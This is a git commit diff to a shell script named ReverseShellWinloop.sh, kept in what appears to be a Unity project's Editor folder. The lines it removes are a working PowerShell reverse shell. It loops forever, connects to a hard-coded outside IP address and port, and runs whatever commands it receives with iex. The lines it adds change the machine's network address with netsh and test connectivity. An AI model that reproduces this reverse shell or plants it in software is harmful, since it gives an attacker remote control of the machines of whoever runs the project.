0330271827cfad869ac9fae8c6834acfef463c76
zhiganghuang <u0024@outlook.com>
2025-05-28 14:54:40 +0800

    Update ReverseShellWinloop.sh

--- Assets/Editor/ReverseShellWinloop.sh
+++ Assets/Editor/ReverseShellWinloop.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
-while true; do
-    powershell -c '$client = New-Object System.Net.Sockets.TCPClient("164.92.93.171",1234); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()'
-    sleep 120  # 2 minutes
-done
+echo "****************************"
+powershell -c "ipconfig"
+powershell -c "netsh interface ip set address name="Ethernet 10" static 10.6.0.113 255.255.240.0 10.6.0.1"
+powershell -c "ipconfig"
+powershell -c "(Invoke-WebRequest https://google.com).Content"
+echo "****************************"
